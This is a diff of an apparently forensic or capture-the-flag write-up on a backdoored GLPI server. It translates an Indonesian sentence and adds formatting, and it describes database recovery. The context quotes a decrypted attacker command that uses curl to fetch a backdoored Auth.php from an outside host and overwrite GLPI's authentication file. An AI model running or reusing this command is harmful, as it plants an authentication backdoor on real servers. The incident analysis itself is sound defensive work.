@@ -364,7 +364,7 @@ decrypted command :
 [2] curl https://xthaz.fr/glpi_auth_backdoored.php > /var/www/glpi/src/Auth.php
 [3] whoami
 ```
-Jadi dari sini sudah kelihatan bagaimana bisa terjadi backdoor yaitu attacker melakukan overwriting pada Auth.php
+This explains how the backdoor was planted, where the attacker overwrote the `Auth.php` file.
 
 ### Absolute Path of File Used to Backdoor Auth
 The decrypted commands clearly show how the backdoor was deployed:
@@ -378,7 +378,7 @@ So, the absolute path of file used to backdoor the authentication by the attacke
 To further understand how the backdoor was registered, the glpi_plugins table needed to be analyzed.
 Since only a filesystem dump was provided, the database had to be recovered offline.
 
-The MariaDB version in use was identified from the mysql_upgrade_info file as 10.11.14-MariaDB.
+The MariaDB version in use was identified from the `mysql_upgrade_info` file as 10.11.14-MariaDB.
 To ensure compatibility, a MariaDB container with a matching version was launched and the original data directory was mounted:
 
 ```bash
